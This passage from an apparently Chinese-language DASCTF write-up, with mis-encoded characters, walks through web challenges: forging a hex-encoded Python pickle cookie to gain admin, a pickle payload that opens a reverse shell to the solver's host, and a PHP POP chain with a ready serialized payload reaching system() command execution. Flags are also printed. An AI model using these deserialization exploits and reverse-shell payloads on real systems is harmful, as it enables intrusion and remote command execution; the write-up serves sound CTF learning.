</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">INPUT_FILE</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;å·²è‡ªåŠ¨åˆ›å»ºç©ºçš„ &#39;</span><span class="si">{</span><span class="n">INPUT_FILE</span><span class="si">}</span><span class="s2">&#39;ã€‚è¯·å‘å…¶ä¸­å¡«å……éœ€è¦åˆ†æçš„æ•°æ®ã€‚&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">text</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">extracted_data</span> <span class="o">=</span> <span class="n">extract_from_text</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">OUTPUT_FILE</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">,</span> <span class="n">newline</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">csvfile</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">writer</span> <span class="o">=</span> <span class="n">csv</span><span class="o">.</span><span class="n">writer</span><span class="p">(</span><span class="n">csvfile</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">writer</span><span class="o">.</span><span class="n">writerow</span><span class="p">([</span><span class="s2">&#34;category&#34;</span><span class="p">,</span> <span class="s2">&#34;value&#34;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="n">writer</span><span class="o">.</span><span class="n">writerows</span><span class="p">(</span><span class="n">extracted_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;åˆ†æå®Œæˆã€‚å…±è¯†åˆ« </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">extracted_data</span><span class="p">)</span><span class="si">}</span><span class="s2"> æ¡æœ‰æ•ˆæ•æ„Ÿæ•°æ®ã€‚ç»“æœå·²ä¿å­˜è‡³ &#39;</span><span class="si">{</span><span class="n">OUTPUT_FILE</span><span class="si">}</span><span class="s2">&#39;ã€‚&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿è¡Œï¼Œå¾—åˆ°<code>export.csv</code>ï¼Œä¸Šä¼ ï¼Œæ­£ç¡®ç‡&gt;=98%å³å¯å¾—åˆ°Flagï¼š<code>DASCTF{34164200333121342836358909307523}</code></p>
<h2 id="web">WEB
</h2><h3 id="ez_blog">ez_blog
</h3><p>æ‰“å¼€ç½‘é¡µï¼Œå‘ç°è¦ç™»å½•ï¼Œæ ¹æ®æç¤ºï¼Œå°è¯•ä½¿ç”¨ç”¨æˆ·å<code>guest</code>å¯†ç <code>guest</code>æˆåŠŸç™»å½•è®¿å®¢ï¼Œå‘ç°Cookiesè®°å½•äº†ä¸€ä¸ª<code>Token=8004954b000000000000008c03617070948c04557365729493942981947d94288c026964944b028c08757365726e616d65948c056775657374948c0869735f61646d696e94898c096c6f676765645f696e948875622e</code>ã€‚é€šè¿‡AIåˆ†æï¼Œå¯çŸ¥è¿™æ˜¯pickleç»è¿‡åºåˆ—åŒ–ç„¶åè½¬æ¢æˆhexå¾—åˆ°çš„ï¼Œè§£ç å¯å‘ç°ï¼š<code>KappUser)}(idusernameguesis_admin       logged_inub.</code>ï¼Œå°è¯•é€šè¿‡ä¿®æ”¹é‡Œé¢çš„å†…å®¹ï¼Œå°†<code>username</code>æ”¹æˆ<code>admin</code>ï¼Œ<code>is_admin</code>æ”¹æˆ<code>True</code>ï¼Œå¾—åˆ°ï¼š<code>8004954b000000000000008c03617070948c04557365729493942981947d9428 8c026964944b028c08757365726e616d65948c0561646d696e948c0869735f61 646d696e94888c096c6f676765645f696e948875622e</code>ï¼Œé€šè¿‡BurpSuiteä¿®æ”¹è¯·æ±‚æ—¶çš„Cookiesï¼ŒæˆåŠŸæ‹¿åˆ°adminç”¨æˆ·çš„æƒé™ï¼ˆå¯ä»¥åˆ›å»ºæ–‡ç« ï¼‰ï¼š
<img src="/ez_blog-1.png"
	
	
	
	loading="lazy"
	
		alt="ez_blog-1.png"
	
	
>
ä¹Ÿå°±æ˜¯è¯´ï¼ŒæœåŠ¡ç«¯ä¼šå°†Tokenååºåˆ—åŒ–ï¼Œå¯ä»¥ä»¥æ­¤åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´ã€‚å› ä¸ºæ²¡æœ‰å›æ˜¾ï¼Œåªèƒ½åå¼¹shellã€‚ç¼–å†™Payloadï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">binascii</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Exploit</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s1">&#39;&#39;&#39;python3 -c &#34;import os
</span></span></span><span class="line"><span class="cl"><span class="s1">import socket
</span></span></span><span class="line"><span class="cl"><span class="s1">import subprocess
</span></span></span><span class="line"><span class="cl"><span class="s1">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
</span></span></span><span class="line"><span class="cl"><span class="s1">s.connect((&#39;&lt;Your IP&gt;&#39;, 2333))
</span></span></span><span class="line"><span class="cl"><span class="s1">os.dup2(s.fileno(), 0)
</span></span></span><span class="line"><span class="cl"><span class="s1">os.dup2(s.fileno(), 1)
</span></span></span><span class="line"><span class="cl"><span class="s1">os.dup2(s.fileno(), 2)
</span></span></span><span class="line"><span class="cl"><span class="s1">p = subprocess.call([&#39;/bin/sh&#39;, &#39;-i&#39;])&#34;&#39;&#39;&#39;</span><span class="p">,))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">Exploit</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">hex_token</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">hexlify</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">hex_token</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">obj</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿è¡Œå¾—åˆ°Payloadï¼š<code>80049510010000000000008c05706f736978948c0673797374656d9493948cf5707974686f6e33202d632022696d706f7274206f730a696d706f727420736f636b65740a696d706f72742073756270726f636573730a733d736f636b65742e736f636b657428736f636b65742e41465f494e45542c20736f636b65742e534f434b5f53545245414d290a732e636f6e6e6563742828273c596f75722049503e272c203233333329290a6f732e6475703228732e66696c656e6f28292c2030290a6f732e6475703228732e66696c656e6f28292c2031290a6f732e6475703228732e66696c656e6f28292c2032290a70203d2073756270726f636573732e63616c6c285b272f62696e2f7368272c20272d69275d292294859452942e</code>ï¼ŒæœåŠ¡å™¨ä¸Šè¿è¡Œ<code>nc -lvvp 2333</code>ï¼Œå°†Payloadä½œä¸ºTokenå‘é€è¯·æ±‚åæˆåŠŸæ‹¿åˆ°Shellã€‚Flagå­˜æ”¾åœ¨<code>/thisisthefffflllaaaggg.txt</code>ä¸­ï¼š
<img src="/ez_blog-2.png"
	
	
	
	loading="lazy"
	
		alt="ez_blog-2.png"
	
	
>
å¾—åˆ°Flagï¼š<code>DASCTF{15485426979172729258466667411440}</code></p>
<h3 id="ez_unserialize">ez_unserialize
</h3><p>é¢˜ç›®æºç ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$first</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$step</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">first</span> <span class="o">=</span> <span class="s2">&#34;ç»§ç»­åŠ æ²¹ï¼&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">start</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">E</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$you</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$found</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$secret</span> <span class="o">=</span> <span class="s2">&#34;admin123&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$name</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$name</span> <span class="o">===</span> <span class="s2">&#34;secret&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="o">.</span><span class="nv">$name</span><span class="o">.</span><span class="s2">&#34; maybe is here!&lt;/br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">found</span><span class="o">-&gt;</span><span class="na">check</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">F</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$fifth</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$step</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$finalstep</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">check</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/U/&#34;</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">finalstep</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;ä»”ç»†æƒ³æƒ³ï¼&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">step</span> <span class="o">=</span> <span class="k">new</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">finalstep</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">step</span><span class="p">)();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">H</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$who</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$are</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$you</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">you</span> <span class="o">=</span> <span class="s2">&#34;nobody&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">who</span><span class="o">-&gt;</span><span class="na">start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">N</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$congratulation</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$yougotit</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nx">string</span> <span class="nv">$func_name</span><span class="p">,</span> <span class="k">array</span> <span class="nv">$args</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$func_name</span><span class="p">,</span><span class="nv">$args</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">U</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$almost</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$there</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$cmd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">there</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">N</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cmd</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">there</span><span class="o">-&gt;</span><span class="na">system</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cmd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">V</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$good</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$keep</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$dowhat</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$go</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$abc</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">dowhat</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">go</span><span class="o">-&gt;</span><span class="nv">$abc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;&lt;br&gt;Win!!!&lt;/br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;payload&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><strong>åˆ©ç”¨æ€è·¯ï¼ˆç®€çŸ­ï¼‰</strong></p>
<ol>
<li>åˆ©ç”¨ <code>H::__destruct()</code> åœ¨å¯¹è±¡é”€æ¯æ—¶è§¦å‘ <code>who-&gt;start()</code>ã€‚</li>
<li><code>A::start()</code> <code>echo $this-&gt;next</code>ï¼Œå› æ­¤æŠŠ <code>next</code> è®¾ä¸º <code>V</code> çš„å®ä¾‹ï¼Œä½¿ <code>V::__toString()</code> è¢«è°ƒç”¨ã€‚</li>
<li><code>V::__toString()</code> ä¼šè¯»å– <code>$this-&gt;go-&gt;$abc</code>ï¼Œå¦‚æœ <code>dowhat = &quot;secret&quot;</code> ä¸” <code>go</code> æ˜¯ <code>E</code> çš„å®ä¾‹ï¼Œåˆ™ä¼šè§¦å‘ <code>E::__get(&quot;secret&quot;)</code>ã€‚</li>
<li><code>E::__get</code> ä¼šè°ƒç”¨ <code>$this-&gt;found-&gt;check()</code>ï¼Œå…¶ä¸­ <code>found</code> æ˜¯ <code>F</code> çš„å®ä¾‹ã€‚</li>
<li><code>F::check()</code> æ–°å»º <code>$this-&gt;finalstep()</code> å¹¶éšå <code>($this-&gt;step)()</code> è°ƒç”¨å¯¹è±¡ã€‚å¦‚æœè®¾ç½® <code>finalstep = &quot;u&quot;</code>ï¼ˆå°å†™ï¼‰ï¼Œ<code>new 'u'</code> ä¼š case-insensitive å®ä¾‹åŒ–ç±» <code>U</code>ï¼Œä»è€Œç»•è¿‡ <code>preg_match(&quot;/U/&quot;)</code> çš„é˜»æ–­ã€‚</li>
<li><code>U::__construct()</code> æ„é€  <code>N</code>ï¼ˆåœ¨é‚£é‡Œå®šä¹‰äº† <code>__call</code>ï¼‰ï¼Œå¹¶æŠŠ <code>cmd = $_POST['cmd']</code>ã€‚<code>U::__invoke()</code> è°ƒç”¨ <code>$this-&gt;there-&gt;system($this-&gt;cmd)</code>ï¼Œè§¦å‘ <code>N::__call()</code> ä½¿ç”¨ <code>call_user_func('system', ...)</code> æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚
=&gt; æœ€ç»ˆè¾¾åˆ° <code>system($_POST['cmd'])</code> æ‰§è¡Œã€‚</li>
</ol>
<p><strong>ç›´æ¥å¯ç”¨çš„åºåˆ—åŒ– payloadï¼ˆå·²æ‰‹å·¥æ„é€ ï¼‰</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">O:1:&#34;H&#34;:1:{s:3:&#34;who&#34;;O:1:&#34;A&#34;:1:{s:4:&#34;next&#34;;O:1:&#34;V&#34;:2:{s:6:&#34;dowhat&#34;;s:6:&#34;secret&#34;;s:2:&#34;go&#34;;O:1:&#34;E&#34;:1:{s:5:&#34;found&#34;;O:1:&#34;F&#34;:1:{s:9:&#34;finalstep&#34;;s:1:&#34;u&#34;;}}}}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>è§£é¢˜è„šæœ¬ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd"> * pop_chain_generator.php
</span></span></span><span class="line"><span class="cl"><span class="sd"> *
